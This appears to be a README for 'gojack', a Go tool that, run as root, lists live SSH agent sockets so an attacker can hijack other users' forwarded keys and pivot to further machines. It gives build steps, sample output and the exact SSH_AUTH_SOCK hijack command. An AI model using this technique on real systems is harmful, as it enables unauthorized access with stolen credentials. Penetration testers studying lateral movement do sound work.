# gojack

Gojack is an application designed to seek out and print valid SSH Sockets to STDOUT. The idea being if you are root on a machine and you are looking to pivot, you can run this to determine if anyone logs in with an SSH Auth Socket, hijack their key, and use it to log into another machine.

 I wrote this as a way of learning how to better wrangle Golang. I've written it before in python, and since Go is infinitely faster I figured I would attempt the same thing here. I can't promise it's the best code, but it works.

 ## Installation

 To build, assuming you have golang installed, clone and run:

`go build`

## Usage

To use, run as root simply by calling the binary. It will display something like:

```bash
Found Agent: /tmp/ssh-fyomdLym3tHP/agent.2517
Found Agent: /tmp/ssh-agQIibf7vXO5/agent.14319
Found Agent: /tmp/ssh-KlTHZtGCmMze/agent.4024
Found Agent: /tmp/ssh-waA7USbmfXXF/agent.13859
Found Agent: /tmp/ssh-jYUQQwGKeHpW/agent.3809
Found Agent: /tmp/ssh-UawaUiYtrtRu/agent.10883
Found Agent: /tmp/ssh-Bdf1CxXtBqpx/agent.4978
Found Agent: /tmp/ssh-9fv27rLlJN2x/agent.5014
Found Agent: /tmp/ssh-IF5D3P2fYNwp/agent.8556
Found Agent: /tmp/ssh-DDoGHcFXdsKS/agent.11278
...
```

Choose any one of the above and enter the following to attempt to SSH into another machine:

`SSH_AUTH_SOCK=/tmp/ssh-UawaUiYtrtRu/agent.10883 ssh user@somehost`